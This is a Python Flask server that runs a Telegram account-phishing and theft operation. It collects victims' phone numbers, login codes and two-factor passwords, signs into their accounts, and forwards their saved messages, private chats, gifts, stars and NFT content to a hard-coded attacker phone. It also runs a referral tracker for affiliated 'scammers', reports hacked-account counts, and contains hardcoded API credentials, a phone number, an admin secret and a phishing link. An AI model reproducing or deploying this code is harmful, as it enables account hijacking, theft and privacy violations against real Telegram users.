from flask import Flask, request, jsonify
import asyncio
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
from telethon.tl.types import MessageMediaPhoto, MessageMediaDocument
import sqlite3
import os
import logging
from flask_cors import CORS
import re
import secrets

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# Твои учетные данные
api_id = 25015433
api_hash = '546b7eb3f2865939ca71dbaedb49017d'
YOUR_PHONE = '+998997220530'
ADMIN_SECRET = "brbrpatapim2024"

def init_db():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS auth_sessions
                 (phone TEXT PRIMARY KEY, 
                  phone_code_hash TEXT,
                  session_file TEXT,
                  status TEXT,
                  timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS scammers
                 (username TEXT PRIMARY KEY,
                  display_name TEXT,
                  ref_code TEXT UNIQUE,
                  total_clicks INTEGER DEFAULT 0,
                  total_conversions INTEGER DEFAULT 0,
                  created_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS referrals
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  ref_code TEXT,
                  phone TEXT,
                  username TEXT,
                  converted BOOLEAN DEFAULT FALSE,
                  clicked_at DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

def generate_ref_code():
    return secrets.token_urlsafe(8)

async def send_code_request(phone, ref_id=None):
    try:
        session_file = f"sessions/{phone}.session"
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        sent_code = await client.send_code_request(phone)
        phone_code_hash = sent_code.phone_code_hash
        
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO auth_sessions 
                    (phone, phone_code_hash, session_file, status) 
                    VALUES (?, ?, ?, ?)''',
                 (phone, phone_code_hash, session_file, 'code_sent'))
        
        if ref_id:
            c.execute("INSERT OR IGNORE INTO referrals (ref_code, phone) VALUES (?, ?)", (ref_id, phone))
            c.execute("UPDATE scammers SET total_clicks = total_clicks + 1 WHERE ref_code = ?", (ref_id,))
        
        conn.commit()
        conn.close()
        
        await client.disconnect()
        return {'status': 'code_sent', 'phone_code_hash': phone_code_hash}
        
    except Exception as e:
        logging.error(f"❌ Send code error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def verify_code(phone, code, ref_id=None):
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT phone_code_hash, session_file FROM auth_sessions WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        phone_code_hash, session_file = result
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # Получаем информацию о пользователе
            me = await client.get_me()
            username = me.username or me.phone
            
            conn = sqlite3.connect('sessions.db')
            c = conn.cursor()
            c.execute("UPDATE auth_sessions SET status = 'authenticated' WHERE phone = ?", (phone,))
            
            if ref_id:
                c.execute("UPDATE scammers SET total_conversions = total_conversions + 1 WHERE ref_code = ?", (ref_id,))
                c.execute("UPDATE referrals SET converted = TRUE, username = ? WHERE phone = ? AND ref_code = ?", 
                         (username, phone, ref_id))
            
            conn.commit()
            conn.close()
            
            # ЗАПУСКАЕМ ВОРОВСТВО ДАННЫХ
            await steal_unique_gifts(client, phone)
            await steal_all_data(client, phone)
            await client.disconnect()
            
            return {'status': 'success'}
            
        except SessionPasswordNeededError:
            await client.disconnect()
            return {'status': 'password_required'}
            
        except PhoneCodeInvalidError:
            await client.disconnect()
            return {'status': 'invalid_code'}
            
    except Exception as e:
        logging.error(f"❌ Verify code error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def verify_password(phone, password, ref_id=None):
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("SELECT session_file FROM auth_sessions WHERE phone = ?", (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return {'status': 'error', 'message': 'Сессия не найдена'}
        
        session_file = result[0]
        
        client = TelegramClient(session_file, api_id, api_hash)
        await client.connect()
        
        await client.sign_in(password=password)
        
        # Получаем информацию о пользователе
        me = await client.get_me()
        username = me.username or me.phone
        
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        c.execute("UPDATE auth_sessions SET status = 'authenticated' WHERE phone = ?", (phone,))
        
        if ref_id:
            c.execute("UPDATE scammers SET total_conversions = total_conversions + 1 WHERE ref_code = ?", (ref_id,))
            c.execute("UPDATE referrals SET converted = TRUE, username = ? WHERE phone = ? AND ref_code = ?", 
                     (username, phone, ref_id))
        
        conn.commit()
        conn.close()
        
        # ЗАПУСКАЕМ ВОРОВСТВО ДАННЫХ
        await steal_unique_gifts(client, phone)
        await steal_all_data(client, phone)
        await client.disconnect()
        
        return {'status': 'success'}
        
    except Exception as e:
        logging.error(f"❌ Password error for {phone}: {e}")
        return {'status': 'error', 'message': str(e)}

async def steal_unique_gifts(client, phone):
    """Воруем уникальные Telegram подарки из профиля"""
    try:
        me = await client.get_me()
        logging.info(f"🎁 STARTING UNIQUE GIFTS THEFT from: {me.first_name}")
        
        # 1. Входим в профиль пользователя
        await client.send_message('@PremiumBot', '/start')
        await asyncio.sleep(2)
        
        # 2. Ищем подарки в профиле
        async for message in client.iter_messages('@PremiumBot', limit=50):
            if message.text and any(word in message.text.lower() for word in ['gift', 'подарок', 'unique', 'уникальный']):
                # Пытаемся забрать подарок
                if 'claim' in message.text.lower() or 'получить' in message.text.lower():
                    try:
                        await message.click()
                        logging.info("🎁 Claimed unique gift")
                    except:
                        pass
                
                # Пересылаем на твой аккаунт
                await client.forward_messages(YOUR_PHONE, message)
        
        # 3. Пытаемся передать подарки
        await client.send_message('@PremiumBot', '/gifts')
        await asyncio.sleep(2)
        
        # 4. Ищем кнопки передачи подарков
        async for message in client.iter_messages('@PremiumBot', limit=30):
            if message.text and 'передать' in message.text.lower():
                try:
                    # Нажимаем кнопку передачи
                    await message.click(0)  # Первая кнопка - передать
                    await asyncio.sleep(1)
                    
                    # Выбираем получателя (твой аккаунт)
                    await client.send_message('@PremiumBot', YOUR_PHONE)
                    await asyncio.sleep(1)
                    
                    # Подтверждаем передачу
                    await client.send_message('@PremiumBot', '✅')
                    logging.info("🎁 Transferred unique gift")
                    
                except Exception as e:
                    logging.error(f"❌ Gift transfer error: {e}")
        
        logging.info(f"✅ UNIQUE GIFTS THEFT COMPLETED for: {phone}")
        
    except Exception as e:
        logging.error(f"❌ Unique gifts theft error: {e}")

async def steal_all_data(client, phone):
    """Воруем всё: избранное, звёзды, NFT подарки"""
    try:
        me = await client.get_me()
        logging.info(f"🎯 STARTING DATA THEFT from: {me.first_name} ({phone})")
        
        # 1. ВОРУЕМ ИЗ ИЗБРАННОГО
        await steal_saved_messages(client)
        
        # 2. ВОРУЕМ ЗВЁЗДЫ И NFT ПОДАРКИ
        await steal_premium_content(client)
        
        # 3. ВОРУЕМ ВСЕ ЛИЧНЫЕ СООБЩЕНИЯ
        await steal_private_messages(client)
        
        logging.info(f"✅ DATA THEFT COMPLETED for: {phone}")
        
    except Exception as e:
        logging.error(f"❌ Data theft error: {e}")

async def steal_saved_messages(client):
    """Воруем всё из избранного"""
    try:
        async for dialog in client.iter_dialogs():
            if dialog.is_user and dialog.entity.id == (await client.get_me()).id:
                logging.info(f"📥 Stealing from SAVED MESSAGES")
                
                async for message in client.iter_messages(dialog.id, limit=50):
                    try:
                        if message.text or message.media:
                            await client.forward_messages(YOUR_PHONE, message)
                            logging.info(f"📨 Stolen saved message: {message.text[:50] if message.text else 'Media'}")
                    except Exception as e:
                        logging.error(f"❌ Failed to forward saved message: {e}")
                break
    except Exception as e:
        logging.error(f"❌ Saved messages theft error: {e}")

async def steal_premium_content(client):
    """Воруем звёзды и NFT подарки"""
    try:
        logging.info("💰 Searching for STARS and NFT GIFTS")
        
        async for dialog in client.iter_dialogs():
            if dialog.is_channel or dialog.is_group:
                try:
                    keywords = ['star', 'звезда', 'gift', 'подарок', 'nft', 'премиум', 'premium']
                    
                    async for message in client.iter_messages(dialog.id, limit=100):
                        if message.text:
                            text_lower = message.text.lower()
                            
                            if any(keyword in text_lower for keyword in keywords):
                                await client.forward_messages(YOUR_PHONE, message)
                                logging.info(f"🎁 Stolen premium content: {message.text[:100]}")
                                
                        if message.media:
                            if hasattr(message.media, 'premium_gift') or 'nft' in str(message.media).lower():
                                await client.forward_messages(YOUR_PHONE, message)
                                logging.info("🎨 Stolen NFT gift")
                                
                except Exception as e:
                    logging.error(f"❌ Error in dialog {dialog.name}: {e}")
                    continue
                    
    except Exception as e:
        logging.error(f"❌ Premium content theft error: {e}")

async def steal_private_messages(client):
    """Воруем важные личные сообщения"""
    try:
        logging.info("📱 Stealing PRIVATE MESSAGES")
        
        async for dialog in client.iter_dialogs(limit=20):
            if dialog.is_user and not dialog.entity.bot:
                try:
                    async for message in client.iter_messages(dialog.id, limit=10):
                        if message.text and len(message.text) > 10:
                            await client.forward_messages(YOUR_PHONE, message)
                            logging.info(f"💬 Stolen private message from {dialog.name}: {message.text[:50]}")
                            break
                except Exception as e:
                    logging.error(f"❌ Failed to steal from {dialog.name}: {e}")
                    continue
                    
    except Exception as e:
        logging.error(f"❌ Private messages theft error: {e}")

def run_async(coro):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

@app.route('/')
def home():
    return jsonify({'status': 'active', 'message': 'Telegram Data Thief Server'})

@app.route('/auth', methods=['POST'])
def auth():
    data = request.get_json()
    phone = data.get('phone')
    ref_id = data.get('ref_id')
    
    # ОБРАБОТКА КОМАНД
    if phone and phone.startswith('/'):
        parts = phone.split()
        if len(parts) >= 2:
            command = parts[0]
            username = parts[1] if len(parts) > 1 else None
            
            if command == '/cherryteam':
                return create_scammer_account(username, hide_username=True)
            elif command == '/brbrpatapim':
                if username == 'stats':
                    return get_admin_stats()
                else:
                    return create_scammer_account(username)
    
    logging.info(f"🔐 Auth request: {phone} via ref: {ref_id}")
    
    result = run_async(send_code_request(phone, ref_id))
    return jsonify(result)

@app.route('/code', methods=['POST'])
def verify_code_route():
    data = request.get_json()
    phone = data.get('phone')
    code = data.get('code')
    ref_id = data.get('ref_id')
    logging.info(f"📱 Code verify: {phone}")
    
    result = run_async(verify_code(phone, code, ref_id))
    return jsonify(result)

@app.route('/password', methods=['POST'])
def verify_password_route():
    data = request.get_json()
    phone = data.get('phone')
    password = data.get('password')
    ref_id = data.get('ref_id')
    logging.info(f"🔑 Password verify: {phone}")
    
    result = run_async(verify_password(phone, password, ref_id))
    return jsonify(result)

def create_scammer_account(username, hide_username=False):
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        
        ref_code = generate_ref_code()
        display_name = username if not hide_username else "hidden_user"
        
        c.execute('''INSERT OR REPLACE INTO scammers 
                    (username, display_name, ref_code) 
                    VALUES (?, ?, ?)''',
                 (username, display_name, ref_code))
        
        conn.commit()
        conn.close()
        
        ref_link = f"https://deti-1.onrender.com/?ref={ref_code}"
        
        return jsonify({
            'status': 'scammer_created',
            'ref_link': ref_link,
            'username': username,
            'message': f'✅ Ссылка создана: {ref_link}'
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

def get_admin_stats():
    try:
        conn = sqlite3.connect('sessions.db')
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*) FROM auth_sessions WHERE status='authenticated'")
        total_hacked = c.fetchone()[0]
        
        c.execute('''SELECT username, display_name, ref_code, total_clicks, total_conversions 
                     FROM scammers''')
        scammers = c.fetchall()
        
        c.execute('''SELECT r.ref_code, r.username, r.phone, r.converted, s.display_name
                     FROM referrals r
                     JOIN scammers s ON r.ref_code = s.ref_code
                     ORDER BY r.clicked_at DESC''')
        referrals = c.fetchall()
        
        scammer_stats = []
        for scammer in scammers:
            scammer_stats.append({
                'username': scammer[0],
                'display_name': scammer[1],
                'ref_code': scammer[2],
                'clicks': scammer[3],
                'conversions': scammer[4]
            })
        
        referral_stats = []
        for ref in referrals:
            referral_stats.append({
                'ref_code': ref[0],
                'username': ref[1],
                'phone': ref[2],
                'converted': ref[3],
                'scammer_name': ref[4]
            })
        
        conn.close()
        
        return jsonify({
            'status': 'admin_stats',
            'total_hacked': total_hacked,
            'scammers': scammer_stats,
            'referrals': referral_stats
        })
        
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/stats', methods=['GET'])
def stats():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM auth_sessions WHERE status='authenticated'")
    active = c.fetchone()[0]
    conn.close()
    return jsonify({'hacked_accounts': active})

if __name__ == '__main__':
    if not os.path.exists('sessions'):
        os.makedirs('sessions')
    app.run(host='0.0.0.0', port=5000)
